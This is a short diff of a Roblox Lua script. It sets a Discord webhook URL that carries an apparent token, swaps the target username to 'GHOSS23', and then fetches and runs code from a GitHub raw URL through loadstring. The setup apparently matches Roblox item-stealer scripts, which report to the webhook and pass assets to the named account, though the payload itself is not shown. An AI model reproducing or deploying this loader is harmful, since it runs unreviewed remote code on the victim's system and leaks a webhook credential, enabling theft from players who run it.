@@ -1,4 +1,4 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1434976186999509063/jjItn51GRNYAO2RtJRMn98Tk2eeTJar6GcrFqvA_z56OeX-QWtrjeQ2tOpXDi33S55md"
-getgenv().Username = "zxrx66666"
+getgenv().Username = "GHOSS23"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kevin52772/TRY/refs/heads/main/TRYRBLX"))()
